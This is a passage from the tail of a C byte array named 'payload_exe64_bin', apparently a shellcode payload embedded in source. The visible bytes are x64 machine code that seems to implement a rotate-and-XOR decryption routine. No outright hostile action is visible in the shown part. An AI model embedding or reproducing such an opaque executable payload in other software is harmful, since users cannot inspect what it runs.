  0xcd, 0x89, 0x4c, 0x24, 0x28, 0x44, 0x89, 0x44, 0x24, 0x2c, 0x48, 0x8b,
  0x44, 0x24, 0x28, 0x48, 0x83, 0xc4, 0x10, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc,
  0x4d, 0x85, 0xc9, 0x0f, 0x84, 0x20, 0x01, 0x00, 0x00, 0x48, 0x89, 0x5c,
  0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18,
  0x55, 0x41, 0x55, 0x41, 0x56, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x10,
  0x4c, 0x8b, 0xd1, 0x48, 0x8d, 0x45, 0xf0, 0x4c, 0x2b, 0xd0, 0xbf, 0x01,
  0x00, 0x00, 0x00, 0x48, 0x2b, 0xfa, 0x48, 0x8b, 0xda, 0x41, 0xbd, 0x10,
  0x00, 0x00, 0x00, 0x0f, 0x10, 0x03, 0x48, 0x8d, 0x4d, 0xf0, 0xba, 0x04,
  0x00, 0x00, 0x00, 0x0f, 0x11, 0x45, 0xf0, 0x41, 0x8b, 0x04, 0x0a, 0x31,
  0x01, 0x48, 0x8d, 0x49, 0x04, 0x48, 0x83, 0xea, 0x01, 0x75, 0xf0, 0x8b,
  0x4d, 0xfc, 0x49, 0x8b, 0xf5, 0x8b, 0x45, 0xf8, 0x8b, 0x55, 0xf4, 0x44,
  0x8b, 0x5d, 0xf0, 0x44, 0x03, 0xda, 0x03, 0xc1, 0xc1, 0xc2, 0x05, 0x41,
  0x33, 0xd3, 0xc1, 0xc1, 0x08, 0x33, 0xc8, 0x41, 0xc1, 0xc3, 0x10, 0x03,
  0xc2, 0x44, 0x03, 0xd9, 0xc1, 0xc2, 0x07, 0xc1, 0xc1, 0x0d, 0x33, 0xd0,
  0x41, 0x33, 0xcb, 0xc1, 0xc0, 0x10, 0x48, 0x83, 0xee, 0x01, 0x75, 0xd3,
  0x89, 0x4d, 0xfc, 0x48, 0x8d, 0x4d, 0xf0, 0x89, 0x55, 0xf4, 0x8d, 0x56,
  0x04, 0x44, 0x89, 0x5d, 0xf0, 0x89, 0x45, 0xf8, 0x42, 0x8b, 0x04, 0x11,
  0x31, 0x01, 0x48, 0x8d, 0x49, 0x04, 0x48, 0x83, 0xea, 0x01, 0x75, 0xf0,
  0x4d, 0x3b, 0xcd, 0x41, 0x8b, 0xc1, 0x41, 0x0f, 0x47, 0xc5, 0x48, 0x63,
  0xd0, 0x85, 0xc0, 0x7e, 0x1c, 0x4c, 0x8d, 0x5d, 0xf0, 0x49, 0x8b, 0xc8,
  0x4d, 0x2b, 0xd8, 0x48, 0x8b, 0xf2, 0x41, 0x8a, 0x04, 0x0b, 0x30, 0x01,
  0x48, 0xff, 0xc1, 0x48, 0x83, 0xee, 0x01, 0x75, 0xf1, 0x4c, 0x2b, 0xca,
  0x48, 0x8d, 0x4b, 0x0f, 0x4c, 0x03, 0xc2, 0x80, 0x01, 0x01, 0x75, 0x0c,
  0x48, 0xff, 0xc9, 0x48, 0x8d, 0x04, 0x0f, 0x48, 0x85, 0xc0, 0x7f, 0xef,
  0x4d, 0x85, 0xc9, 0x0f, 0x85, 0x2e, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x5c,
  0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x8b, 0x7c, 0x24, 0x40,
  0x48, 0x83, 0xc4, 0x10, 0x41, 0x5e, 0x41, 0x5d, 0x5d, 0xc3
};
unsigned int payload_exe64_bin_len = 3082;
